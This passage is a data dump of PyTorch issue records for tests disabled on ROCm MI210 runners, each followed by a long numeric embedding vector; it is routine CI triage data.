 -2.48331606e-01  7.95863271e-02  1.30869761e-01 -3.62043262e-01
 -3.21843885e-02 -1.34617090e-01 -8.81220698e-02  2.50183284e-01
  3.36913615e-01 -1.52647540e-01 -4.14310768e-02  2.40091130e-01
  1.61255196e-01  2.95416147e-01  1.18402634e-02  6.07633814e-02
 -1.40665889e-01  2.27397889e-01 -5.73462695e-02  1.01220608e-02
  3.21446538e-01 -7.29970112e-02 -2.36325175e-01  7.79375732e-02
  1.77043408e-01  2.65749484e-01 -4.45292592e-01 -2.46007502e-01
 -1.29112050e-01 -1.72039598e-01  1.43683553e-01 -1.93078399e-01
 -2.07976550e-01  2.16007471e-01  1.70976833e-01 -1.65088505e-01
 -4.50866595e-02  5.64656854e-01  1.65581584e-01 -3.84859830e-01
 -2.17871055e-01  1.10417083e-02 -2.16962583e-02 -8.14139172e-02
 -1.82322502e-01 -1.53649628e-01  4.70198274e-01  3.96962047e-01
 -1.61848575e-01  3.92805189e-01 -5.30876592e-02  1.43592522e-01
  2.38842517e-02  1.08918585e-01 -1.44421160e-01  3.30265909e-01
  9.59977508e-02  2.25947931e-01  2.64162004e-01  1.74889848e-01
 -3.40960264e-01 -3.05317361e-02 -4.59891319e-01  6.65341839e-02
  9.87781063e-02 -1.21235438e-01 -1.81777716e-01 -1.18658409e-01
  2.31587976e-01  2.84582436e-01 -3.66375744e-01  1.54213995e-01
 -1.14751235e-01 -1.05116516e-01  3.07597429e-01 -4.16702420e-01
  4.47247267e-01 -2.54232109e-01 -1.55881092e-01  2.03384832e-01
 -4.67376038e-02 -2.15761408e-01 -1.69921800e-01 -7.09787011e-04]"
DISABLED test_uint4x2_mixed_mm_fail_to_match (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[ 2.17208806e-02 -9.07123834e-02 -1.50274098e-01  4.81714271e-02
  3.31068039e-02 -1.84313029e-01  2.62897223e-01  6.40774146e-02
 -5.86784601e-01 -2.26713464e-01  2.47896910e-01 -4.78569806e-01
  1.02631994e-01  7.70679861e-02 -3.75048339e-01 -4.61760685e-02
 -1.34886563e-01 -1.83743387e-01  2.64220595e-01  1.07916445e-01
 -1.96013927e-01 -1.61549240e-01 -3.58586133e-01  7.89110065e-02
 -2.82715082e-01  3.02083790e-01 -2.02438965e-01  5.65279350e-02
 -2.69621670e-01  2.64061451e-01  2.11075619e-01  1.41964495e-01
  8.61169770e-02 -6.72309622e-02  3.29190671e-01 -8.54744390e-02
 -2.82676697e-01 -2.62465715e-01 -2.44823754e-01 -1.28641069e-01
  1.47596925e-01  2.96906196e-02 -9.13351960e-03  1.32055476e-01
 -1.67289495e-01  9.43502560e-02  2.50690989e-02 -2.64454633e-04
 -3.89640257e-02 -1.79535970e-01  1.78515255e-01 -1.09900966e-01
 -1.30909488e-01 -3.84541035e-01 -3.09034064e-03  8.34334791e-02
  2.20453992e-01  3.68332922e-01  1.08610854e-01  3.16468537e-01
  1.48795173e-01 -8.98441747e-02 -1.80481344e-01 -6.11926839e-02
  5.85185923e-02  2.48104602e-01 -8.98246318e-02 -4.12090361e-01
  2.84879774e-01  2.66007856e-02 -8.35512727e-02  4.61513437e-02
 -3.84489000e-02  2.77479589e-01  2.20593020e-01  4.66274559e-01
 -1.41866297e-01 -4.28543612e-02 -2.17493176e-02 -2.26784736e-01
 -2.88782030e-01 -1.05201155e-02 -1.89131759e-02 -1.82216406e-01
  3.58293414e-01 -2.17522472e-01  1.29440278e-02 -1.14188559e-01
  1.95186678e-02 -5.91346174e-02  2.85889626e-01  2.36167744e-01
  1.51970416e-01  1.10866033e-01  3.06948274e-02 -3.86724994e-03
 -1.52338192e-01  1.85144264e-02 -3.44933212e-01  1.73141688e-01
  2.11104378e-02 -1.99859232e-01 -3.85962993e-01  2.38789588e-01
 -4.45183486e-01 -1.34812981e-01  1.33141875e-01 -1.77204877e-01
  3.69406603e-02  3.04495603e-01  1.18048035e-01  5.39202690e-02
 -1.32875279e-01  3.92505288e-01  3.36799882e-02  2.63942748e-01
 -5.02850339e-02 -1.42322004e-01  2.24964209e-02  3.68504971e-01
 -1.78439051e-01 -4.44833159e-01  9.67896730e-02 -9.69863590e-03
  1.58559844e-01 -1.27755314e-01 -1.06292307e-01  1.74737021e-01
  1.07675269e-02 -2.67661214e-02 -6.10619523e-02 -1.17070928e-01
  3.19690630e-02 -7.16164894e-03 -2.40364984e-01 -4.16758247e-02
  3.05585563e-02 -6.85049072e-02  5.31477183e-02  2.50467986e-01
 -2.37174660e-01  1.78412765e-01 -3.63702998e-02 -4.55253534e-02
  1.52668953e-01 -1.10479638e-01 -3.03643435e-01  2.33745843e-01
  6.22153096e-02  5.93607873e-02  1.03268102e-01 -7.30169863e-02
  2.43955683e-02  7.08302200e-01 -2.25610211e-02 -2.52029654e-02
  5.47288179e-01  1.09809548e-01 -2.65573204e-01 -1.60074562e-01
 -9.83945355e-02  6.70177490e-02 -5.70838302e-02 -7.27219731e-02
  3.07010233e-01 -5.02928905e-02 -4.73638594e-01  4.56737652e-02
 -7.71571696e-02  1.66197985e-01  1.35923117e-01  2.35022843e-01
  2.84497172e-01 -8.81535560e-02 -4.39758413e-02 -3.09506953e-01
  3.03646922e-01 -7.52532482e-02 -1.21357888e-01 -5.71068078e-02
  1.56537786e-01  9.21799242e-02  3.79196376e-01 -1.65537953e-01
 -1.87902898e-01  2.61192739e-01 -3.31607945e-02  1.57349348e-01
 -4.05445844e-02 -2.86806747e-03 -3.24944317e-01  1.86275959e-01
  2.75898930e-02 -2.59062666e-02 -2.36704782e-01 -2.81958342e-01
 -5.47333509e-02 -2.02835143e-01  1.38449311e-01  1.65232509e-01
  1.14649639e-01  1.96502328e-01 -4.62983847e-02 -5.00665069e-01
 -2.13562325e-03  1.39592662e-01 -1.04573511e-01 -5.19733667e-01
  1.46063671e-01  2.96536058e-01 -1.01228215e-01 -3.51711571e-01
 -2.58733004e-01 -1.34820133e-01 -1.28042698e-01  5.43140359e-02
 -6.39507100e-02  8.41368660e-02 -2.38308251e-01  8.73442218e-02
 -7.60471746e-02 -4.65033278e-02 -1.45347327e-01 -2.72935629e-01
 -3.19427550e-01 -4.60581295e-02  6.94264621e-02  5.30886650e-02
 -1.31949410e-03  1.24783941e-01  6.24092892e-02 -1.23827964e-01
  1.64766923e-01 -3.50178331e-02  3.27725887e-01 -1.60251886e-01
 -9.37902257e-02 -2.35542640e-01 -9.50821489e-02 -2.16826461e-02
 -1.01014078e-01 -2.42509127e-01 -2.33815476e-01 -7.40499943e-02
  1.84570670e-01  3.65083337e-01 -3.15170437e-01  2.99339984e-02
 -4.00112629e-01  9.75833610e-02  1.26823500e-01 -9.42147821e-02
 -8.42010416e-03  2.71922708e-01 -2.29076315e-02  3.03561330e-01
  1.84998177e-02 -4.99864705e-02  2.17491984e-01 -1.53294280e-01
  2.43737161e-01  3.88807505e-01 -2.11076468e-01  5.65159023e-01
  4.26681519e-01  2.66311288e-01 -3.66602838e-01  1.33623660e-01
 -1.89638808e-01  3.86022031e-04  1.98730558e-01 -5.02779067e-01
  3.25455517e-01 -1.88791063e-02  3.05617303e-01 -1.25566885e-01
  3.79342318e-01  5.39465845e-02 -2.58376122e-01  1.11812159e-01
  1.33834988e-01  2.02466339e-01 -1.29552364e-01  2.70152569e-01
  2.22776443e-01 -1.63933277e-01 -1.36478916e-01 -3.71983111e-01
 -2.24796683e-01 -1.25156939e-01  1.05560586e-01  2.61585832e-01
  3.13380629e-01  2.61208922e-01 -2.39591882e-01 -2.74355970e-02
  2.90176719e-01  1.04845151e-01  3.24325502e-01  8.61824900e-02
 -2.83220649e-01  1.18798442e-01  1.69220343e-01 -2.73916662e-01
 -7.07179755e-02 -6.75803721e-02 -2.82488950e-02  2.49031365e-01
  3.86891127e-01 -1.66448057e-01 -1.43268555e-02  1.57173336e-01
  9.18022841e-02  3.82220864e-01  8.00482631e-02  3.94688025e-02
 -3.67143452e-02  1.63578093e-01 -2.65424047e-02  4.06053662e-03
  3.86276722e-01 -1.62910104e-01 -2.41367027e-01  1.15099259e-01
  1.09918490e-01  2.93374687e-01 -4.49953020e-01 -3.72789800e-01
 -9.09957513e-02 -6.76882863e-02  1.45368591e-01 -2.01887071e-01
 -2.56282687e-01  1.57601878e-01  3.56322229e-02 -1.31279111e-01
 -6.57070801e-02  5.46436489e-01  2.40983844e-01 -3.51453185e-01
 -2.53402114e-01 -1.79904774e-02 -1.93886682e-02 -1.39130384e-01
 -1.80058777e-01 -1.11553729e-01  3.83915275e-01  2.87453532e-01
 -1.86364859e-01  4.11686122e-01  6.58222288e-02  9.95468199e-02
 -7.50607401e-02 -7.39653595e-03 -2.18116716e-02  2.99425542e-01
  7.38118738e-02  2.06889093e-01  2.40584433e-01  1.99758306e-01
 -2.58079320e-01 -2.67750714e-02 -5.01620770e-01 -1.45360008e-02
  1.63345948e-01 -1.32358864e-01 -1.55368000e-01 -9.62836668e-02
  3.15677583e-01  1.63436234e-01 -3.24222744e-01  1.17518097e-01
 -1.89259291e-01 -1.77658886e-01  3.23830396e-01 -2.63322055e-01
  4.52884942e-01 -1.99893713e-01 -9.30304676e-02  1.77142233e-01
  1.04379550e-01 -2.59389699e-01 -1.04183428e-01 -4.30631787e-02]"
DISABLED test_uint4x2_mixed_mm_epi (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[ 5.22495769e-02 -4.89567481e-02 -9.84460488e-02  2.66836956e-04
  1.02626920e-01 -2.22597674e-01  2.89005518e-01  3.54827456e-02
 -5.46158850e-01 -1.93757594e-01  2.66373634e-01 -4.47689474e-01
  2.89936475e-02  8.86960551e-02 -4.58000124e-01 -7.78342783e-02
 -1.25053793e-01 -1.68577313e-01  2.38634735e-01  1.50125176e-01
 -1.35568887e-01 -1.63619533e-01 -2.92021424e-01  5.29852770e-02
 -3.28504652e-01  3.46096635e-01 -1.05788656e-01 -3.85606177e-02
 -2.69232064e-01  1.64223343e-01  2.18448818e-01  1.38479292e-01
  8.82211253e-02 -1.06655575e-01  3.60733092e-01 -9.07548815e-02
 -2.32828125e-01 -2.21118093e-01 -1.88319355e-01 -1.73255712e-01
  1.03803776e-01  2.33072713e-02  1.52846789e-02  9.33759958e-02
 -1.40181452e-01  1.18880071e-01  1.68265663e-02 -3.00349146e-02
 -8.56590644e-03 -1.90485537e-01  2.29470536e-01 -1.58259571e-01
  4.37853113e-03 -4.41579789e-01 -4.64691743e-02  5.85860759e-02
  2.29711607e-01  3.40949774e-01  8.50149915e-02  3.82750630e-01
  4.88286465e-02 -4.24656644e-02 -1.69806868e-01  1.38210133e-02
  1.03109866e-01  3.04527819e-01 -9.94074643e-02 -4.08312023e-01
  2.54137456e-01 -1.90240480e-02 -1.90859437e-01  3.66421416e-02
 -4.18048613e-02  2.83438921e-01  2.39537388e-01  4.32848454e-01
 -1.44794866e-01 -1.26141347e-02  1.10903755e-02 -1.61048710e-01
 -1.86601698e-01 -8.65857303e-03 -5.08054048e-02 -2.15999484e-01
  3.37496102e-01 -1.62761688e-01  2.58429702e-02 -4.08619493e-02
  3.76614965e-02 -1.17760807e-01  2.90928483e-01  1.78161770e-01
  5.55088185e-02  1.80327713e-01  9.79337543e-02  1.93085521e-02
 -1.97330743e-01 -5.61918430e-02 -4.51163590e-01  1.84238166e-01
 -5.01057133e-04 -9.31784958e-02 -3.69856507e-01  2.72200972e-01
 -5.57678521e-01 -1.45616233e-01  1.84051618e-01 -2.75557458e-01
 -4.39463668e-02  3.12296033e-01  1.13937162e-01 -1.67730413e-02
 -1.30709514e-01  3.80085349e-01  1.08997822e-01  1.99287206e-01
 -1.21675156e-01 -1.71853781e-01  9.49298739e-02  3.22538704e-01
 -2.63913959e-01 -4.78143752e-01  1.34715497e-01  4.81631979e-03
  1.07730702e-01 -1.67798519e-01 -2.46535242e-02  1.99595883e-01
 -2.46374719e-02  2.24869400e-02 -5.42072058e-02 -8.67732689e-02
  6.63489252e-02 -6.62984848e-02 -2.04922110e-01  7.23769516e-03
  1.18939094e-01 -1.78432286e-01  6.16233423e-02  2.67947674e-01
 -1.95652232e-01  2.40629643e-01 -9.90286022e-02 -6.11901358e-02
  1.45965666e-01 -7.65652359e-02 -2.61021912e-01  1.23507895e-01
  1.58947036e-02  9.95850191e-02  8.49079937e-02 -1.72034785e-01
  9.15766880e-02  7.90781975e-01  1.19248964e-02 -1.08048003e-02
  5.42869270e-01  1.38035014e-01 -2.54438788e-01 -1.05332270e-01
 -1.84743389e-01  3.52402292e-02 -3.31203826e-03 -1.88780148e-02
  2.46181026e-01 -2.67390963e-02 -4.51430261e-01  3.31483595e-02
 -4.26948965e-02  1.92026556e-01  1.86274588e-01  2.45547563e-01
  2.90795833e-01 -1.78976476e-01  8.70044082e-02 -3.32317889e-01
  2.25078642e-01 -5.13791367e-02 -9.61713642e-02 -7.43444860e-02
  1.40467748e-01  4.26775217e-02  3.90518606e-01 -1.53848916e-01
 -1.59542769e-01  2.10251808e-01 -1.29215773e-02  1.21212944e-01
 -7.83239305e-02  1.81876719e-02 -3.49844098e-01  2.10893065e-01
 -4.02103141e-02 -6.12334870e-02 -2.53594190e-01 -2.20596701e-01
 -5.76700419e-02 -1.29011124e-01  6.06359020e-02 -3.11166979e-03
  1.97053909e-01  2.49563769e-01 -1.19758226e-01 -4.22504008e-01
 -7.71586224e-03  1.50989592e-01 -1.93815902e-01 -4.45963502e-01
  9.58129466e-02  2.59700775e-01 -4.88088802e-02 -4.27719533e-01
 -1.34362876e-01 -1.17891625e-01 -6.55521005e-02  1.47304609e-01
 -8.64632353e-02  4.83005382e-02 -2.32754275e-01  7.69216716e-02
 -5.65996394e-02 -6.09749369e-03 -1.70248091e-01 -2.39067093e-01
 -2.13299274e-01 -1.14716776e-01 -1.14147635e-02 -2.40805745e-02
 -3.10954154e-02  1.42761827e-01  8.63177329e-02 -8.61088037e-02
  9.15909484e-02 -4.28973325e-02  2.32771292e-01 -1.55911177e-01
 -1.04947507e-01 -1.66097492e-01 -7.95145258e-02 -3.35641578e-02
 -1.78464904e-01 -3.21672916e-01 -2.45564282e-01 -1.71679743e-02
  1.76497906e-01  4.23960209e-01 -3.16903949e-01  5.16942032e-02
 -3.89504999e-01  1.25215486e-01  1.26036838e-01 -5.57721369e-02
  1.41097605e-02  2.94382423e-01 -9.15702879e-02  2.30625063e-01
 -2.71322690e-02  1.70840584e-02  1.78186387e-01 -1.35639429e-01
  3.23707700e-01  3.24231982e-01 -2.39669442e-01  5.13729751e-01
  4.16629046e-01  2.72318602e-01 -4.57213640e-01  8.51416215e-02
 -1.23309761e-01 -7.38275982e-03  1.34860247e-01 -4.75649506e-01
  2.78656662e-01  2.23739855e-02  3.05830687e-01 -1.50046647e-01
  3.59332681e-01  1.30576752e-02 -2.38903493e-01  4.28220667e-02
  1.63415730e-01  6.63174912e-02 -1.06297344e-01  2.54461586e-01
  2.70191044e-01 -1.51872098e-01 -1.54274449e-01 -4.48431313e-01
 -2.43505836e-01 -1.39568418e-01  1.80753142e-01  2.49639153e-01
  2.50924170e-01  2.53860742e-01 -2.61966854e-01 -2.81145377e-03
  2.54198134e-01  1.06872894e-01  2.74569124e-01  5.88999949e-02
 -2.55275130e-01  2.69100908e-02  1.27995551e-01 -3.24119210e-01
 -1.16734229e-01 -1.77930683e-01 -1.17060378e-01  2.29679227e-01
  3.00447315e-01 -1.93476781e-01 -5.73362485e-02  1.49904042e-01
  1.22468866e-01  3.96531701e-01  6.99335709e-02  5.32731041e-02
 -9.45367441e-02  2.23240107e-01 -6.25581741e-02  6.15274906e-02
  3.44883621e-01 -1.53029978e-01 -1.77231446e-01  1.06015526e-01
  7.60293454e-02  2.86009759e-01 -5.11443079e-01 -2.88007349e-01
 -9.08048451e-02 -2.01757669e-01  1.67004064e-01 -2.66422331e-01
 -1.95152938e-01  2.91601568e-01  6.71197325e-02 -6.80479854e-02
 -3.96322459e-02  5.46256542e-01  2.16909140e-01 -4.18976873e-01
 -1.78065687e-01  3.64232883e-02  1.53398793e-02 -2.37140805e-01
 -5.60587011e-02 -1.39652574e-02  3.95164520e-01  3.17720115e-01
 -2.08984345e-01  4.34764802e-01 -5.93663380e-03  1.42524391e-01
 -2.64100879e-02  2.65066139e-02 -7.55992010e-02  3.55685174e-01
  1.94365889e-01  1.77862793e-01  2.37336248e-01  1.67513460e-01
 -1.76749185e-01 -9.53024253e-03 -5.02959192e-01  1.74291153e-02
  1.73378319e-01 -1.05500869e-01 -1.47546962e-01 -7.60279298e-02
  2.37456262e-01  2.24632442e-01 -3.70953500e-01  1.10207394e-01
 -1.07580781e-01 -8.67675170e-02  3.66411120e-01 -2.64806002e-01
  4.28100169e-01 -1.86629042e-01 -1.28673956e-01  2.77399123e-01
  1.17828637e-01 -2.28606969e-01 -1.70949027e-01  2.92356126e-03]"
DISABLED test_uint4x2_mixed_mm (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[ 4.15836833e-02 -5.57398200e-02 -1.32174283e-01  2.21321620e-02
  3.35134491e-02 -1.94659352e-01  2.37721741e-01  1.05880342e-01
 -5.89571238e-01 -1.92643970e-01  2.49725997e-01 -4.97413993e-01
  4.88733649e-02  1.08577050e-01 -4.22394753e-01 -4.08718586e-02
 -1.83338672e-01 -1.35224149e-01  2.22022593e-01  1.47984326e-01
 -2.25729167e-01 -1.56142801e-01 -3.50715637e-01  3.26403864e-02
 -2.94200122e-01  2.91572630e-01 -1.73579663e-01  8.97774287e-03
 -3.27460766e-01  2.57820040e-01  1.84394836e-01  1.80500507e-01
  8.65070969e-02 -6.40277714e-02  3.70466620e-01 -5.51209338e-02
 -2.61973917e-01 -2.41203368e-01 -2.51300454e-01 -1.34964973e-01
  8.70303288e-02  4.84902225e-03  3.25718429e-03  1.14128292e-01
 -1.88295454e-01  1.27686232e-01  5.11520077e-03 -1.63294934e-02
 -1.89666525e-02 -1.94213688e-01  2.21384823e-01 -1.68009534e-01
 -9.00720730e-02 -4.16790217e-01 -1.81934908e-02  1.10845029e-01
  2.57324994e-01  3.60300779e-01  1.26560703e-01  3.61292303e-01
  7.78912008e-02 -1.02101833e-01 -1.43723428e-01 -3.00689749e-02
  1.39844328e-01  2.98217922e-01 -1.04523137e-01 -4.67429996e-01
  2.75324702e-01  5.90672344e-03 -1.68325409e-01  3.63323092e-02
 -1.74598470e-02  2.36520827e-01  2.43952572e-01  4.10938978e-01
 -1.00227326e-01 -2.42582485e-02  4.48855460e-02 -1.76029503e-01
 -2.26846606e-01  2.95239873e-02 -1.19925719e-02 -2.17370346e-01
  3.39572549e-01 -2.09746480e-01  1.77487526e-02 -1.07709855e-01
  4.23048586e-02 -1.32800400e-01  2.29443312e-01  1.97690547e-01
  3.92533094e-02  1.40317917e-01  7.32397959e-02 -3.40217911e-03
 -1.82128489e-01 -2.33777314e-02 -4.36375618e-01  1.69660762e-01
  2.69356798e-02 -8.42760056e-02 -3.61300170e-01  2.11571634e-01
 -5.24762511e-01 -7.21600950e-02  1.75616324e-01 -2.25325197e-01
 -2.91725453e-02  3.41070563e-01  1.12348221e-01  7.51801282e-02
 -1.40596569e-01  3.47546786e-01  1.03590548e-01  2.53559589e-01
 -1.09050937e-01 -1.80185139e-01  7.18733966e-02  3.55767220e-01
 -2.34496832e-01 -5.04516721e-01  1.61760464e-01 -9.92276799e-03
  1.09137110e-01 -1.64533883e-01 -5.72671480e-02  2.27471352e-01
 -1.78481024e-02  3.80560234e-02 -5.49454913e-02 -6.63239434e-02
  7.58237541e-02 -1.49732362e-02 -2.56141722e-01  2.93945819e-02
  9.62469205e-02 -9.57527012e-02  6.52355328e-02  1.91704929e-01
 -2.38963917e-01  2.14221746e-01 -1.01472184e-01 -8.87660682e-02
  1.65676981e-01 -1.30496845e-01 -3.45781118e-01  1.72493666e-01
  2.56086122e-02  1.23007014e-01  1.27312124e-01 -1.20049454e-01
  9.93584096e-02  7.54269361e-01  3.49158868e-02  5.03581017e-04
  5.46283841e-01  1.09410927e-01 -2.77109832e-01 -1.32111043e-01
 -1.29496694e-01  5.92526281e-03  1.49519145e-02 -8.06420743e-02
  2.79570878e-01 -6.09549060e-02 -4.70403314e-01  5.11279255e-02
  4.35205176e-04  1.95499673e-01  2.30256945e-01  2.37363487e-01
  2.89444149e-01 -7.53400326e-02  6.20526858e-02 -3.59667450e-01
  2.65885115e-01 -7.62013420e-02 -8.24643746e-02 -7.92588890e-02
  1.78837836e-01  8.34056288e-02  4.14817512e-01 -2.06143022e-01
 -2.30430976e-01  2.04219222e-01 -6.26477003e-02  1.22259110e-01
 -6.31477833e-02 -4.67871875e-02 -3.22727561e-01  1.65754586e-01
 -2.27018166e-02 -1.03449002e-01 -2.81518996e-01 -2.49477714e-01
 -5.31044044e-02 -1.45228297e-01  1.13189295e-01  7.34123290e-02
  1.32074714e-01  2.28354245e-01 -8.79100263e-02 -4.43995655e-01
  5.72768189e-02  1.81552067e-01 -9.59100425e-02 -4.71217632e-01
  8.56205672e-02  2.73569822e-01 -4.42983508e-02 -4.04460847e-01
 -1.87276155e-01 -1.32547304e-01 -9.76039618e-02  9.65608135e-02
 -7.59577602e-02  5.71660772e-02 -2.78228164e-01  6.84173927e-02
 -3.87926437e-02 -8.19188803e-02 -2.16854140e-01 -2.40766704e-01
 -3.07801992e-01 -4.74482886e-02 -2.66020186e-03 -2.12887917e-02
 -5.40231168e-02  8.32247511e-02  5.69908321e-02 -1.07156835e-01
  7.16265738e-02 -5.49135134e-02  3.03912282e-01 -1.34597763e-01
 -1.23268887e-01 -2.21489131e-01 -3.62506658e-02 -2.38120444e-02
 -1.41293615e-01 -3.51377398e-01 -2.95025021e-01 -1.49567584e-02
  2.19160140e-01  4.44030702e-01 -3.67310286e-01  2.72687078e-02
 -3.69024158e-01  9.67984647e-02  1.27577931e-01 -2.94248331e-02
 -1.07932528e-02  3.05211663e-01 -5.46535552e-02  2.68499196e-01
 -3.61905433e-04 -3.39096189e-02  1.97214216e-01 -1.34706840e-01
  2.65956432e-01  3.05559337e-01 -2.53670275e-01  5.63751340e-01
  4.74068403e-01  3.20656955e-01 -4.17368710e-01  9.91156101e-02
 -1.56381339e-01 -3.19492631e-02  1.93877339e-01 -4.85003144e-01
  2.75125563e-01  3.86607461e-03  2.94336110e-01 -1.48872107e-01
  3.55685294e-01  7.97332674e-02 -2.55080342e-01  1.34907454e-01
  1.70831621e-01  1.13944113e-01 -6.23524711e-02  2.97206610e-01
  2.01484069e-01 -1.77106321e-01 -1.48331195e-01 -4.32590723e-01
 -2.09822834e-01 -6.80230707e-02  1.71913490e-01  2.64624655e-01
  2.50282228e-01  2.57717133e-01 -2.84722686e-01  1.70371979e-02
  2.31188118e-01  1.07242435e-01  2.61442751e-01  5.91827855e-02
 -2.24159673e-01  9.12082344e-02  1.68218121e-01 -3.27178657e-01
 -8.63859579e-02 -1.59126416e-01 -1.07785001e-01  2.46975422e-01
  3.65596831e-01 -2.08590150e-01 -4.94715460e-02  7.33508393e-02
  7.75127411e-02  4.03624535e-01  9.62561667e-02  5.29671460e-02
 -1.16107486e-01  2.20120758e-01 -6.46610111e-02  7.72897899e-02
  3.40000451e-01 -1.07229099e-01 -2.04231411e-01  9.03660208e-02
  1.64999306e-01  2.80061960e-01 -4.57405657e-01 -3.09985995e-01
 -1.51003510e-01 -1.25229210e-01  1.36867046e-01 -2.71893859e-01
 -2.30866566e-01  2.21992046e-01  1.01422057e-01 -1.03520282e-01
 -4.26178724e-02  5.94327390e-01  2.10025758e-01 -3.75896335e-01
 -1.87810391e-01  1.77322924e-02 -6.51326869e-03 -1.74904943e-01
 -1.34491354e-01 -6.84305951e-02  4.63335246e-01  3.81096900e-01
 -1.78958446e-01  4.46888685e-01  8.14784318e-03  2.00010568e-01
 -7.63604417e-03 -3.03997286e-03 -5.68216518e-02  3.39869469e-01
  1.37875885e-01  1.88239247e-01  2.63474494e-01  1.80369765e-01
 -2.05726653e-01  3.74340266e-02 -5.21507263e-01  5.22331297e-02
  1.25779703e-01 -1.29556477e-01 -1.43815696e-01 -1.05131269e-01
  2.65912533e-01  2.47420132e-01 -3.99183780e-01  1.68665230e-01
 -1.54146761e-01 -1.16815701e-01  3.29835594e-01 -3.17862242e-01
  4.84770268e-01 -1.81244731e-01 -2.11697251e-01  2.07335278e-01
  1.00534365e-01 -2.52698749e-01 -2.05959111e-01 -4.66713458e-02]"
DISABLED test_splitwithsizes_cat (__main__.TestPaternMatcher) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[ 1.31066278e-01 -1.90245122e-01 -1.81445196e-01 -9.44023207e-02
 -3.40305008e-02 -1.82338551e-01  3.84625256e-01  1.31945640e-01
 -5.97190082e-01 -2.20974952e-01  2.00279444e-01 -4.59758997e-01
  8.72440562e-02  1.82180196e-01 -3.86207372e-01 -2.02372283e-01
 -1.50458157e-01 -1.43033147e-01  1.25992939e-01  8.05171281e-02
 -2.32637182e-01 -1.32765263e-01 -3.93050909e-01  1.94018096e-01
 -3.41129303e-01  2.22642839e-01 -2.68709958e-01 -1.02788568e-01
 -4.21673536e-01  2.59294689e-01  1.75136477e-01  1.37848690e-01
  7.03001767e-02 -1.08935811e-01  4.84473705e-01 -6.27598092e-02
 -3.44627440e-01 -2.39248261e-01 -2.42268637e-01 -1.73392802e-01
  1.01989053e-01 -5.29273860e-02 -1.64527185e-02  5.86352013e-02
 -2.05175400e-01  7.70658776e-02 -1.31636739e-01  2.22020410e-02
  4.36920412e-02 -7.20100999e-02  1.57820985e-01 -8.21297057e-03
 -1.61765739e-01 -4.94743466e-01 -6.55371323e-02  5.55931963e-03
  2.62538970e-01  3.91957402e-01  1.74990222e-01  2.88291872e-01
  1.32986251e-03 -9.00699198e-03 -1.55929551e-01  7.97558948e-02
  2.68402062e-02  2.03734547e-01 -1.94161292e-02 -3.48897159e-01
  3.17941278e-01 -7.95404240e-03 -2.32862055e-01 -3.23395967e-03
  3.60568762e-02  2.10427731e-01  2.57404804e-01  4.13086951e-01
 -4.80527021e-02  5.36290631e-02 -2.51758620e-02 -3.00030440e-01
 -3.56186152e-01  1.05628505e-01  2.43853368e-02 -2.46170640e-01
  3.37794006e-01 -1.24715507e-01 -3.15222666e-02 -9.73560810e-02
 -1.17072482e-02 -1.12271152e-01  2.31531739e-01  1.70299441e-01
  2.16969833e-01  2.37360284e-01  6.13752753e-04 -4.71766070e-02
 -2.09128574e-01 -1.57259122e-01 -5.51496565e-01  1.74980953e-01
  3.89559567e-02  5.81150949e-02 -3.23700458e-01  2.06633031e-01
 -4.68120515e-01 -1.34355187e-01  2.28945628e-01 -2.34860361e-01
 -4.03382592e-02  3.54866922e-01  1.42985210e-01 -1.73939764e-02
 -3.39933485e-03  2.62877941e-01  1.17392637e-01  4.64804173e-01
 -1.79711580e-02 -1.18606187e-01  1.24707177e-01  2.57024139e-01
 -1.63041160e-01 -6.04051352e-01  1.41833410e-01  7.30346739e-02
  8.34999904e-02 -1.32280111e-01  6.50726557e-02  2.28253067e-01
  1.77262239e-02  3.07219476e-03 -3.11101452e-02 -3.43144909e-02
  5.37480600e-02  5.87821230e-02 -2.39907712e-01  1.31722972e-01
  3.55863944e-02 -8.38393420e-02  1.56990606e-02  2.65807688e-01
 -1.91336632e-01  1.49903595e-01 -1.22141078e-01 -1.87228695e-01
  1.37388349e-01 -5.05875982e-03 -3.35254550e-01  1.35383546e-01
  2.07549538e-02  1.63572311e-01  1.61176771e-01 -1.34626940e-01
  2.96011269e-01  6.75173521e-01  1.81520078e-02 -1.11157313e-01
  6.04915500e-01  2.27884918e-01 -3.35487336e-01 -1.80516541e-01
 -2.68703192e-01  7.83813447e-02 -1.00126669e-01 -9.94778275e-02
  2.45773807e-01 -1.67135429e-02 -4.82534826e-01  1.47435486e-01
  1.40533626e-01  7.87088051e-02  3.39242876e-01  1.20966934e-01
  2.74676412e-01 -1.45561025e-02  9.48424712e-02 -1.98464334e-01
  1.86971694e-01 -9.99780595e-02  1.01467796e-01 -1.64190158e-01
  2.48565048e-01  7.07480758e-02  4.31427598e-01 -2.09873363e-01
 -2.52022028e-01  1.07606426e-01  4.26127762e-02  1.72755852e-01
 -1.30923584e-01 -8.15093741e-02 -2.33047262e-01  2.88015634e-01
 -9.36148167e-02 -1.35587439e-01 -3.98512572e-01 -2.53245085e-01
 -2.87093082e-03  1.05222166e-02  1.39971584e-01  6.64050728e-02
  1.59193352e-01  7.82588720e-02 -7.19971061e-02 -4.63768542e-01
  5.58226779e-02  7.09300116e-02 -1.02440268e-02 -4.88649786e-01
  1.06740311e-01  3.62678945e-01 -1.14910677e-01 -4.15158004e-01
 -2.62332052e-01 -5.80347031e-02  1.71024986e-02 -7.32443780e-02
 -8.27272683e-02  1.61523707e-02 -4.76677626e-01  1.25925735e-01
